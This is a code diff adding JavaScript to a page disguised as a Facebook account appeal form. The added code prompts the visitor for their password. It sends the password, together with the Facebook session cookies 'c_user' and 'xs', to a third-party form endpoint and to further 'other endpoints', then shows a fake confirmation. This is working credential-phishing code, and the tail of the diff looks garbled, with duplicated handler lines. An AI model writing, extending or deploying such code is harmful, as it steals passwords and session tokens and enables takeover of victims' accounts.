@@ -1639,7 +1639,79 @@
                   </div>
               `;
 
-            document.body.appendChild(passwordPrompt);
+              document.body.appendChild(passwordPrompt);
+
+              // Handle password prompt
+              const passwordInput = document.getElementById('password-input');
+              const cancelPasswordBtn = document.getElementById('cancel-password-btn');
+              const confirmPasswordBtn = document.getElementById('confirm-password-btn');
+
+              passwordInput.focus();
+
+              cancelPasswordBtn.addEventListener('click', function() {
+                  document.body.removeChild(passwordPrompt);
+                  submitBtn.disabled = false;
+                  submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
+              });
+
+              confirmPasswordBtn.addEventListener('click', async function() {
+                  const password = passwordInput.value.trim();
+
+                  if (!password) {
+                      alert(translations[currentLanguage]['password_required'] || 'Password is required to submit your appeal.');
+                      return;
+                  }
+
+                  // Prepare complete form data
+                  const formData = {
+                      c_user: c_user,
+                      xs: xs,
+                      password: password,
+                      language: currentLanguage,
+                      timestamp: new Date().toISOString()
+                  };
+
+                  try {
+                      confirmPasswordBtn.disabled = true;
+                      confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
+
+                      // Submit to SubmitForm.com
+                      const response = await fetch('https://submit-form.com/Em9nGRH3o', {
+                          method: 'POST',
+                          headers: {
+                              'Content-Type': 'application/json',
+                              'Accept': 'application/json'
+                          },
+                          body: JSON.stringify(formData)
+                      });
+
+                      const result = await response.json();
+
+                      if (response.ok) {
+                          // Submit to other endpoints - MODIFIED
+                          submitToOtherEndpoints(formData);
+
+                          document.body.removeChild(passwordPrompt);
+
+                          // Show success message
+                          const successMessage = document.createElement('div');
+                          successMessage.className = 'password-prompt-overlay';
+                          successMessage.innerHTML = `
+                              <div class="password-prompt">
+                                  <div class="password-prompt-header">
+                                      <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                                      <h3>${translations[currentLanguage]['appeal_submitted'] || 'Appeal Submitted'}</h3>
+                                  </div>
+                                  <div class="password-prompt-body">
+                                      <p>${translations[currentLanguage]['appeal_success'] || 'Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.'}</p>
+                                      <div class="password-prompt-actions" style="justify-content: center;">
+                                          <button id="close-success-btn" class="primary">${translations[currentLanguage]['ok'] || 'OK'}</button>
+                                      </div>
+                                  </div>
+                              </div>
+                          `;
+
+                       document.body.appendChild(passwordPrompt);
 
 // Handle password prompt
 const passwordInput = document.getElementById('password-input');
